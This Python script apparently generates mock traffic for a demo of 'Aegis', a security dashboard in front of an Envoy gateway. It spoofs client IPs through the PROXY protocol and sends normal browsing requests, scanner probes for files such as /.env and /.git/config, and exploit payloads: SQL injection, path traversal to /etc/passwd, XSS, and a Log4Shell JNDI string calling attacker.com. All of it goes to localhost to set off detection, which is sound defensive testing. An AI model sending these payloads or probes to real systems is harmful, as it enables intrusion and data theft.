#!/usr/bin/env python3
"""
Aegis Traffic Demo Generator

This script generates realistic, diverse mock traffic to Envoy using the PROXY Protocol.
It populates the Aegis dashboard with a live world map, status charts, device breakdowns, 
and simulates a live cyberattack to showcase Aegis's AI Auto-Blocking capabilities.

REQUIREMENT:
Before running this script, you must enable the "Proxy Protocol" listener filter 
on your "http_listener" (port 10080) in the Aegis UI:
1. Go to Gateway -> Listeners -> http_listener (edit).
2. Scroll to "Listener Filters" -> Add Filter -> "Proxy Protocol".
3. Save and Sync.
"""

import socket
import random
import time
import threading
import sys

# Target configuration
HOST = "localhost"
PORT = 80  # Mapped to Envoy container port 10080

# Global IP Pool mapped to countries for GeoIP visualization
IP_POOL = {
    "US": ["8.8.8.8", "4.2.2.2", "204.13.248.115", "64.233.160.100", "74.125.19.147"],
    "DE": ["5.9.84.45", "46.4.82.117", "78.46.84.21", "176.9.84.102"],
    "JP": ["210.140.10.20", "117.55.233.201", "122.211.4.5", "202.214.100.6"],
    "BR": ["200.147.67.142", "186.192.90.5", "177.126.180.10", "201.55.32.45"],
    "CN": ["114.114.114.114", "223.5.5.5", "180.76.76.76", "202.108.22.5"],
    "AU": ["1.1.1.1", "101.167.230.45", "139.130.4.5", "203.0.178.10"],
    "GB": ["212.58.244.70", "195.92.37.5", "87.242.65.10", "62.253.160.5"],
    "CA": ["198.51.100.50", "204.101.200.5", "142.204.1.2"],
    "FR": ["80.12.240.15", "194.2.0.20", "91.121.100.45"]
}

ALL_COUNTRIES = list(IP_POOL.keys())

# User Agent Pool (Devices & Browsers)
USER_AGENTS = [
    # Desktop Chrome (Windows)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Desktop Safari (Mac)
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    # Mobile Safari (iPhone)
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    # Mobile Chrome (Android)
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    # Googlebot
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    # curl
    "curl/8.4.0"
]

# Mock Paths
NORMAL_PATHS = [
    ("/", "GET"),
    ("/index.html", "GET"),
    ("/static/css/main.css", "GET"),
    ("/static/js/bundle.js", "GET"),
    ("/api/v1/products", "GET"),
    ("/api/v1/products", "POST"),
    ("/api/v1/users/profile", "GET"),
    ("/about", "GET"),
    ("/contact", "GET"),
]

SCAN_PATHS = [
    "/wp-admin",
    "/wp-login.php",
    "/admin.php",
    "/phpmyadmin",
    "/.env",
    "/config.json",
    "/secrets.json",
    "/backup.zip",
    "/.git/config"
]

EXPLOIT_PAYLOADS = [
    ("/api/v1/products?category=1'+OR+'1'='1", "GET", "SQL Injection"),
    ("/api/v1/download?file=../../../../etc/passwd", "GET", "Path Traversal"),
    ("/api/v1/login", "POST", "Log4Shell", "${jndi:ldap://attacker.com/a}"),
    ("/api/v1/search?q=<script>alert(1)</script>", "GET", "Cross-Site Scripting (XSS)")
]

ATTACKER_IP = "99.99.99.99" # Custom IP representing the hacker

stop_event = threading.Event()

def send_raw_http(client_ip, path, method="GET", body=None, user_agent=None):
    """Establishes raw TCP connection, prepends PROXY v1 header, and sends HTTP request."""
    if not user_agent:
        user_agent = random.choice(USER_AGENTS)
        
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((HOST, PORT))
        
        # 1. Generate & Send PROXY Protocol v1 header
        # Format: PROXY TCP4 <source-ip> <dest-ip> <source-port> <dest-port>\r\n
        src_port = random.randint(1024, 65535)
        proxy_header = f"PROXY TCP4 {client_ip} 127.0.0.1 {src_port} 10080\r\n"
        s.sendall(proxy_header.encode())
        
        # 2. Format & Send HTTP request
        req = f"{method} {path} HTTP/1.1\r\n"
        req += f"Host: app.yourdomain.com\r\n"
        req += f"User-Agent: {user_agent}\r\n"
        req += "Connection: close\r\n"
        
        if body:
            req += f"Content-Length: {len(body)}\r\n"
            req += "Content-Type: application/json\r\n"
            req += f"\r\n{body}"
        else:
            req += "\r\n"
            
        s.sendall(req.encode())
        
        # We don't strictly need to read the response to trigger Aegis (ALS logs it on connection close),
        # but reading a bit ensures Envoy processed it.
        _ = s.recv(1024)
        s.close()
    except Exception:
        # Silence connection errors (happens naturally when Aegis blocks an IP and Envoy drops it)
        pass

def legitimate_traffic_loop():
    """Simulates a steady flow of normal global users browsing the site."""
    print("🟢 Started Legitimate Traffic simulation...")
    while not stop_event.is_set():
        # Choose a random country and random IP from that country
        country = random.choice(ALL_COUNTRIES)
        ip = random.choice(IP_POOL[country])
        
        path, method = random.choice(NORMAL_PATHS)
        body = '{"query": "test"}' if method == "POST" else None
        
        send_raw_http(ip, path, method, body)
        
        # Poisson-like random interval (0.1s to 0.8s) to make charts organic
        time.sleep(random.uniform(0.1, 0.8))

def scanner_bot_loop():
    """Simulates a noisy vulnerability scanner probing admin paths."""
    print("🟡 Started Bot Scanner simulation...")
    # Assign scanner to a specific IP from Germany
    scanner_ip = "46.4.82.117" 
    
    while not stop_event.is_set():
        path = random.choice(SCAN_PATHS)
        
        # Rapid bursts, then sleeps
        for _ in range(random.randint(3, 7)):
            if stop_event.is_set():
                break
            send_raw_http(scanner_ip, path, "GET", user_agent="Mozilla/5.0 Scanner/1.0")
            time.sleep(0.05) # Rapid burst
            
        # Wait longer between scans (3s to 8s)
        time.sleep(random.uniform(3.0, 8.0))

def attacker_loop():
    """Simulates a severe attack from 99.99.99.99 that triggers AI Auto-Blocking."""
    print("🔴 Started Hacker Exploit simulation...")
    
    # Wait a few seconds after starting so the user can see clean dashboard first
    time.sleep(8.0)
    
    while not stop_event.is_set():
        path, method, attack_type, *body_payload = random.choice(EXPLOIT_PAYLOADS)
        body = body_payload[0] if body_payload else None
        
        print(f"🔥 Attacker ({ATTACKER_IP}) launching {attack_type} exploit: {path}...")
        
        # Launch attack request
        send_raw_http(ATTACKER_IP, path, method, body, user_agent="curl/attacker-exploit")
        
        # The AI Threat Engine usually takes ~2-5 seconds to detect, notify, and push xDS block
        # We wait 5 seconds and then pump more traffic. You will see the requests start to
        # FAIL immediately once Aegis applies the block!
        time.sleep(5.0)

if __name__ == "__main__":
    print("=" * 60)
    print("             AEGIS MOCK TRAFFIC GENERATOR")
    print("=" * 60)
    print("Press Ctrl+C to stop the generator.\n")
    
    # Test target connection
    try:
        test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_s.settimeout(2.0)
        test_s.connect((HOST, PORT))
        test_s.close()
    except Exception as e:
        print(f"❌ Error: Could not connect to Envoy at {HOST}:{PORT}.")
        print("Please ensure docker-compose is running and ports are exposed.")
        sys.exit(1)

    # Start threads
    t1 = threading.Thread(target=legitimate_traffic_loop, daemon=True)
    t2 = threading.Thread(target=scanner_bot_loop, daemon=True)
    t3 = threading.Thread(target=attacker_loop, daemon=True)
    
    t1.start()
    t2.start()
    t3.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping mock traffic generator...")
        stop_event.set()
        t1.join()
        t2.join()
        t3.join()
        print("Traffic generator stopped. Clean exit.")
